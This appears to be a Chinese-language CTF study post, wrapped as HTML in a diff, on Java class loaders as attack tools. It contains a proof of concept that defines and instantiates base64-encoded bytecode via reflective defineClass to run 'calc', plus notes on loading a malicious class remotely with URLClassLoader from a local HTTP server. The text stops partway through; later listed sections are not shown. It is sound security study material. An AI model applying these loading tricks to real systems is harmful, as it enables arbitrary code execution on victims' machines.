@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ClassLoaderClassLoader快速复习 类加载器 ClassLoader 是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的 Java 类。java.lang.ClassLoader是所有类加载器的父类，在其中有三个关键方法： loadClass(String name, boolean resolve)：该方法用于加载类，并根据 resolve 参数决定是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全3(2)_常用加载方法">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="ClassLoaderClassLoader快速复习 类加载器 ClassLoader 是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的 Java 类。java.lang.ClassLoader是所有类加载器的父类，在其中有三个关键方法： loadClass(String name, boolean resolve)：该方法用于加载类，并根据 resolve 参数决定是">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-18T04:53:23.898Z">
+<meta property="article:modified_time" content="2024-11-20T14:33:37.523Z">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全3(2)_常用加载方法</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/20/Java%E5%AE%89%E5%85%A85(6)_CC3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&text=Java安全3(2)_常用加载方法"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&is_video=false&description=Java安全3(2)_常用加载方法"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全3(2)_常用加载方法&body=Check out this article: https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&title=Java安全3(2)_常用加载方法"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&name=Java安全3(2)_常用加载方法&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/18/Java%E5%AE%89%E5%85%A83(2)_%E5%B8%B8%E7%94%A8%E5%8A%A0%E8%BD%BD%E6%96%B9%E6%B3%95/&t=Java安全3(2)_常用加载方法"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader"><span class="toc-number">1.</span> <span class="toc-text">ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.1.</span> <span class="toc-text">ClassLoader快速复习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#defineClass%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">defineClass加载恶意类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLClassLoader"><span class="toc-number">2.</span> <span class="toc-text">URLClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFURLClassLoader"><span class="toc-number">2.1.</span> <span class="toc-text">什么是URLClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8Bclass"><span class="toc-number">2.2.</span> <span class="toc-text">URLClassLoader加载远程class</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#defineClass-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">defineClass()调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E5%97%A6%E7%BC%98%E7%94%B1"><span class="toc-number">3.1.</span> <span class="toc-text">细嗦缘由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">3.2.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFTemplatesImpl"><span class="toc-number">3.2.1.</span> <span class="toc-text">什么是TemplatesImpl?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.2.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl-poc"><span class="toc-number">3.2.3.</span> <span class="toc-text">TemplatesImpl poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85-%E5%AF%B9%E4%BA%8E-tfactory%E5%8F%82%E6%95%B0%E4%B8%80%E4%BA%9B%E8%AF%AF%E8%A7%A3%E7%9A%84%E4%BF%AE%E6%AD%A3"><span class="toc-number">3.2.4.</span> <span class="toc-text">补充: 对于_tfactory参数一些误解的修正</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL"><span class="toc-number">3.3.</span> <span class="toc-text">BCEL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFBCEL"><span class="toc-number">3.3.1.</span> <span class="toc-text">什么是BCEL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%89%8D%E5%9B%A0%E5%90%8E%E6%9E%9C%E7%9A%84%E8%A1%A5%E5%85%85-%E4%B8%8D%E9%87%8D%E8%A6%81"><span class="toc-number">3.3.2.</span> <span class="toc-text">BCEL前因后果的补充(不重要</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL-poc"><span class="toc-number">3.3.3.</span> <span class="toc-text">BCEL poc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全3(2)_常用加载方法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-18T04:53:23.898Z" class="dt-published" itemprop="datePublished">2024-11-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><h3 id="ClassLoader快速复习"><a href="#ClassLoader快速复习" class="headerlink" title="ClassLoader快速复习"></a>ClassLoader快速复习</h3><ol>
+<li>类加载器 ClassLoader 是实现类加载机制的一个重要组成部分，负责将类文件加载到内存中并转换为可执行的 Java 类。<code>java.lang.ClassLoader</code>是所有类加载器的父类，在其中有三个关键方法：<ol>
+<li><code>loadClass(String name, boolean resolve)</code>：该方法用于加载类，并根据 resolve 参数决定是否解析该类，如果 resolve 为 true，则在加载类的同时，也会解析该类的依赖项。</li>
+<li><code>findClass(String name)</code>：该方法用于查找并加载指定名称的类。</li>
+<li><code>defineClass(String name, byte[] b, int off, int len)</code>：该方法将一个字节数组表示的类定义转换为一个 Class 对象，用于将类的字节码转换为 Class 对象。</li>
+</ol>
+</li>
+<li>操作本地类的字节码(本地文件中的java字节码放置.class文件中)<ol>
+<li><p><strong>编译成字节码</strong>：<code>javac HelloWorld.java</code>，使用当前配置的java版本进行编译，不同java版本可能不能公用字节码</p>
+<blockquote>
+<p>报错关键字: major version<br>每个Java版本都有其特定的类文件格式版本号（major.minor version）。例如：<br>Java 7: 51.0<br>Java 8: 52.0<br>Java 9: 53.0<br>Java 10: 54.0</p>
+</blockquote>
+</li>
+<li><p><strong>反汇编class文件以查看字节码</strong>：<code>javap -c -p -l HelloWorld.class</code></p>
+</li>
+<li><p><strong>查看class文件二进制内容</strong>：可以使用<code>xxd HelloWorld.class</code>来查看</p>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="defineClass加载恶意类"><a href="#defineClass加载恶意类" class="headerlink" title="defineClass加载恶意类"></a>defineClass加载恶意类</h3><blockquote>
+<ol>
+<li>注意到: Class.forName(“类名”)默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用Class.forName(“类名”, 是否初始化类, 类加载器)，而ClassLoader.loadClass默认不会初始化类方法 –&gt; 即使是static{}里的代码也不会执行</li>
+<li>使用base64编码获取.class的字节码<code>cat TestClass.class | base64</code>并结合Byte[]数组可以直接加载类</li>
+</ol>
+</blockquote>
+<ol>
+<li>这里的恶意类ClassLoaderPayload不要带 package 包名</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ClassLoaderPayload.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassLoaderPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoaderRCE.java</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">defineMehtod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineMehtod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// javac ClassLoaderPayload.java &amp;&amp; cat ClassLoaderPayload.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VG&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;aWxlAQAXQ2xhc3NMb2FkZXJQYXlsb2FkLmphdmEMAAkACgcAGwwAHAAdAQAEY2FsYwwAHgAfAQAT&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;amF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQASQ2xhc3NMb2FkZXJQYXlsb2FkAQAQamF2YS9sYW5n&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;L09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9S&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;dW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsB&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAEAAQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;AhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAAAgAEAAQADQAHABAABQARAAYA&quot;</span>+</span><br><span class="line">                                        <span class="string">&quot;FQAIAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAAAAACABE=&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">p</span> <span class="operator">=</span> (Class) defineMehtod.invoke(ClassLoader.getSystemClassLoader(), code , <span class="number">0</span>, code.length);</span><br><span class="line">            p.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><h3 id="什么是URLClassLoader"><a href="#什么是URLClassLoader" class="headerlink" title="什么是URLClassLoader"></a>什么是URLClassLoader</h3><ol>
+<li><p>看看源码和大佬的博客</p>
+<ol>
+<li>翻译1：对应的URL有&#x2F;的就当作目录，没有&#x2F;的就当作jar文件处理</li>
+<li>翻译2：创建 URLClassLoader 实例的线程的 AccessControlContext 将在随后加载类和资源时使用</li>
+<li>翻译3：默认情况下，加载的类仅被授予访问创建 URLClassLoader 时指定的 URL 的权限</li>
+</ol>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This class loader is used to load classes and resources from a search</span></span><br><span class="line"><span class="comment"> * path of URLs referring to both JAR files and directories. Any URL that</span></span><br><span class="line"><span class="comment"> * ends with a &#x27;/&#x27; is assumed to refer to a directory. Otherwise, the URL</span></span><br><span class="line"><span class="comment"> * is assumed to refer to a JAR file which will be opened as needed.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The AccessControlContext of the thread that created the instance of</span></span><br><span class="line"><span class="comment"> * URLClassLoader will be used when subsequently loading classes and</span></span><br><span class="line"><span class="comment"> * resources.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The classes that are loaded are by default granted permission only to</span></span><br><span class="line"><span class="comment"> * access the URLs specified when the URLClassLoader was created.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  David Connelly</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>URLClassLoader 实际上是我们<strong>平时默认使用的 AppClassLoader 的父类</strong></p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Launcher</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AppClassLoader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是<strong>经过处理后的java.net.URL类</strong>）来寻找.class文件来加载</li>
+<li>基础路径有分为三种情况<ol>
+<li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
+<li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻</li>
+<li>找.class文件URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 –&gt; 比如<code>http</code>等远程协议时，涉及到一个问题**Java的URL究竟支持哪些协议?**，后面再来</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p><em><strong>工作原理</strong></em>: 对远程功能的添加在于重写<code>@Override: findClass()</code>这个方法</p>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关于构造函数，这里主要是看到ucp就是我们传入的url的处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">URLClassLoader(URL[] urls, AccessControlContext acc) &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">        security.checkCreateClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line">    ucp = <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(urls);</span><br><span class="line">    <span class="built_in">this</span>.acc = acc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 我的说明：逻辑就不细讲了，但是可以看到在findClass()中处理的ucp就是从外部传入的那个路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">     <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="URLClassLoader加载远程class"><a href="#URLClassLoader加载远程class" class="headerlink" title="URLClassLoader加载远程class"></a>URLClassLoader加载远程class</h3><ol>
+<li><strong>服务器问题</strong>: <code>python -m http.server --bind 127.0.0.1 9999</code>本地文件夹运行python服务器，可以通过<code>127.0.0.1</code>或者 <code>ipconfig</code> 出来的ipv4地址，注意编译class文件的java版本</li>
+<li><strong>远程加载问题</strong>: 部署的要通过URLClassLoader来加载远程服务，由于<strong>双亲委派</strong>模型，导致这里在 loadClass 方法会优先从本地找起，所以需要将编译后的 <code>恶意类.class</code> 放置在项目之外的目录，不然就会找到本地的</li>
+</ol>
